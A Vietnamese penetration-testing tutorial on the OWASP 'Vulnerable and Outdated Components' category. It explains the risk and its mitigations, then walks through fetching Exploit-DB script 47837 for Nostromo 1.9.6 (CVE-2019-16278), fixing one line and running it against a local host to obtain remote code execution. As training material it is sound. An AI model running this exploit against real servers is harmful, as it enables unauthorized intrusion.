## Vulnerable and Outdated Components (Thành Phần Dễ Bị Tấn Công Và Lỗi Thời)

    Trong bối cảnh kiểm tra thâm nhập, việc khai thác các thành phần dễ bị tấn công và lỗi thời (Vulnerable and Outdated Components) là một chiến thuật phổ biến và hiệu quả. Đây là điểm yếu xếp hạng cao trong OWASP Top 10, cho thấy mức độ phổ biến và tác động tiềm tàng của nó.

### Bản Chất Của Vấn Đề

Các ứng dụng hiện đại thường dựa vào nhiều thư viện, framework và thành phần bên thứ ba khác. Nếu các thành phần này không được cập nhật thường xuyên, chúng có thể chứa các lỗ hổng bảo mật đã biết. Kẻ tấn công có thể khai thác những lỗ hổng này để giành quyền truy cập trái phép, thực thi mã độc hoặc đánh cắp dữ liệu nhạy cảm.

### Quy Trình Khai Thác Điểm Yếu
* **Nhận Diện Thành Phần**: Sử dụng các công cụ quét, phân tích mã nguồn hoặc thông tin công khai để xác định các thành phần được sử dụng trong ứng dụng.
* **Kiểm Tra Lỗ Hổng**: So sánh các phiên bản thành phần với cơ sở dữ liệu lỗ hổng bảo mật đã biết (như CVE) để tìm kiếm các lỗ hổng có thể khai thác.
* **Khai Thác Lỗ Hổng**: Nếu tìm thấy lỗ hổng, hãy nghiên cứu các khai thác công khai hoặc phát triển khai thác tùy chỉnh để chứng minh tác động của lỗ hổng.

### Giảm Thiểu Rủi Ro
* Cập Nhật Thường Xuyên: Đảm bảo tất cả các thành phần được cập nhật lên phiên bản mới nhất để vá các lỗ hổng bảo mật đã biết.
* Quét Lỗ Hổng: Sử dụng các công cụ quét lỗ hổng tự động để phát hiện các thành phần dễ bị tấn công.
* Quản Lý Thành Phần: Theo dõi chặt chẽ các thành phần được sử dụng trong ứng dụng và có quy trình cập nhật rõ ràng.

### Ví dụ thực tế

![text](<img/14.png>)
Ta có 1 trang web và có thể thấy rằng máy chủ (server) trang web là Nostromo 1.9.6.

Bây giờ ta lên [**Exploit-DB**](https://www.exploit-db.com/) và tìm kiếm Nostromo 1.9.6

![text1](<img/15.png>)

May mắn thay, kết quả hàng đầu tình cờ là một tập lệnh khai thác. Hãy tải xuống nó và thử lấy mã thực thi. Chạy tập lệnh này một mình sẽ dạy cho chúng ta một bài học rất quan trọng.

```jsx
user@linux$ python 47837.pyTraceback (most recent call last):
  File "47837.py", line 10, in <module>
    cve2019_16278.py
NameError: name 'cve2019_16278' is not defined
```

Các khai thác bạn tải xuống từ Internet có thể không hoạt động ngay lần đầu tiên. Điều này giúp hiểu ngôn ngữ lập trình mà tập lệnh sử dụng để, nếu cần, bạn có thể sửa bất kỳ lỗi nào hoặc thực hiện bất kỳ sửa đổi nào, vì khá nhiều tập lệnh trên Exploit-DB mong đợi bạn thực hiện các sửa đổi.

May mắn thay, lỗi này là do một dòng lẽ ra phải được nhận xét, vì vậy đó là một sửa lỗi dễ dàng.

**Python**

```
# Exploit Title: nostromo 1.9.6 - Remote Code Execution# Date: 2019-12-31# Exploit Author: Kr0ff# Vendor Homepage:# Software Link: http://www.nazgul.ch/dev/nostromo-1.9.6.tar.gz# Version: 1.9.6# Tested on: Debian# CVE : CVE-2019-16278

cve2019_16278.py     # This line needs to be commented.#!/usr/bin/env python

```

Sửa xong, hãy thử chạy lại chương trình.

```jsx

user@linux$ python2 47837.py 127.0.0.1 80 id                                        _____-2019-16278
        _____  _______    ______   _____\    \
   _____\    \_\      |  |      | /    / |    |
  /     /|     ||     /  /     /|/    /  /___/|
 /     / /____/||\    \  \    |/|    |__ |___|/
|     | |____|/ \ \    \ |    | |       \
|     |  _____   \|     \|    | |     __/ __
|\     \|\    \   |\         /| |\    \  /  \
| \_____\|    |   | \_______/ | | \____\/    |
| |     /____/|    \ |     | /  | |    |____/|
 \|_____|    ||     \|_____|/    \|____|   | |
        |____|/                        |___|/

HTTP/1.1 200 OK
Date: Fri, 03 Feb 2023 04:58:34 GMT
Server: nostromo 1.9.6
Connection: close

uid=1001(_nostromo) gid=1001(_nostromo) groups=1001(_nostromo)
```

Boom! Chúng tôi có RCE. Bây giờ điều quan trọng cần lưu ý là hầu hết các tập lệnh sẽ cho bạn biết những đối số bạn cần cung cấp. Các nhà phát triển khai thác hiếm khi bắt bạn đọc hàng trăm dòng mã tiềm năng chỉ để tìm ra cách sử dụng tập lệnh.

Cũng cần lưu ý rằng nó có thể không phải lúc nào cũng dễ dàng như vậy. Đôi khi bạn sẽ chỉ được cung cấp một số phiên bản, như trong trường hợp này, nhưng những lần khác, bạn có thể cần phải tìm hiểu qua mã nguồn HTML hoặc thậm chí đoán may mắn trên một tập lệnh khai thác. Nhưng thực tế, nếu đó là một lỗ hổng đã biết, có lẽ có một cách để khám phá phiên bản ứng dụng đang chạy.

Đó thực sự là nó. Điều tuyệt vời về phần này của OWASP Top 10 là công việc đã được thực hiện cho chúng ta, chúng ta chỉ cần thực hiện một số nghiên cứu cơ bản và với tư cách là người kiểm tra thâm nhập, bạn đã thực hiện điều đó khá nhiều.